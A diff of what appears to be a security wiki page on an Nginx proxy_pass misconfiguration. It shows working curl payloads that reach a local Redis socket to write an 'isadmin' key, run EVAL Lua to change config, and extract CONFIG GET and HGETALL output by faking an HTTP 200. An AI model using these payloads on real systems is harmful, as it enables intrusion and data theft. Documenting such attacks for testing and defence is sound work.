@@ -253,7 +253,6 @@ proxy_pass http://unix:/tmp/backend.sock:/uri/;
 
 {% tab title="Exploit" %}
 Because of this missconfiguration, we can send a request to a local unix socket.
-
 ```bash
 #Request
 curl 'http://example.com/static/unix:%2ftmp%2fsocket.sock:TEST/app-1555347823-min.js'
@@ -264,8 +263,7 @@ Host: localhost
 Connection: close
 ```
 
-For example, we can use it to make requests to a Redis socket and write any key:
-
+For example, we can use it to make requests to a Redis socket and **write any key**:
 ```bash
 #Request that set the key: "hacked" "isadmin" true
 curl -X HSET "http://example.com/static/unix:/var/run/redis/redis.sock:hacked%20isadmin%20true%20/random"
@@ -276,8 +274,7 @@ Host: localhost
 Connection: close
 ```
 
-Also, we may abuse the [EVAL](https://redis.io/commands/eval/) Redis command to perform Arbitrary Redis command execution. We can execute Redis commands from EVAL using two different Lua functions: `redis.call()` and `redis.pcall()`
-
+**Arbitrary Redis command execution** vulnerability may be abuse using the [EVAL](https://redis.io/commands/eval/) command from Redis. We can execute Redis commands from EVAL using two different Lua functions: `redis.call()` and `redis.pcall()`
 ```bash
 # Request to overwrite the maxclients config key:
 curl -X EVAL "http://example.com/static/unix:/var/run/redis/redis.sock:%22return%20redis.call('config','set','maxclients',1337)%22%200%20/app-1555347823-min.js" 
@@ -292,23 +289,14 @@ Connection: close
 None of these commands respond with a valid HTTP response, and Nginx will not forward the output of the commands to the client, but instead a generic 502 Bad Gateway error.
 {% endhint %}
 
-Finaly, In order to **extract data**, we can avoid the `502` error by simply having the string `HTTP/1.0 200 OK` anywhere in the response using string concatenation in the Lua script.
-
+**Extracting data** can be done avoiding the `502` error by simply having the string `HTTP/1.0 200 OK` anywhere in the response using string concatenation in the Lua script.
 ```bash
 #Request to extract response from the CONFIG GET * command
+#You may use other commands like redis.call("hgetall","key") for HGETALL
 curl -X EVAL 'http://example.com/static/unix:/var/run/redis/redis.sock:%27return%20(table.concat(redis.call("config","get","*"),"\n").."%20HTTP/1.1%20200%20OK\r\n\r\n")%27%200%20/app-1555347823-min.js'
 
 #Request sent to /var/run/redis/redis.sock (Redis socket)
 EVAL 'return (table.concat(redis.call("config","get","*"),"\n").." HTTP/1.1 200 OK\r\n\r\n")' 0 -example.s3.amazonaws.com/app-1555347823-min.js HTTP/1.0
-Host: localhost
-Connection: close
-
-
-#Request to extract response from the HGETALL key command
-curl -X EVAL 'http://example.com/static/unix:/var/run/redis/redis.sock:%27return%20(table.concat(redis.call("hgetall","key"),"\n").."%20HTTP/1.1%20200%20OK\r\n\r\n")%27%200%20/app-1555347823-min.js'
-
-#Request sent to /var/run/redis/redis.sock (Redis socket)
-EVAL 'return (table.concat(redis.call("hgetall","key"),"\n").." HTTP/1.1 200 OK\r\n\r\n")' 0 -example.s3.amazonaws.com/app-1555347823-min.js HTTP/1.0
 Host: localhost
 Connection: close
 ```
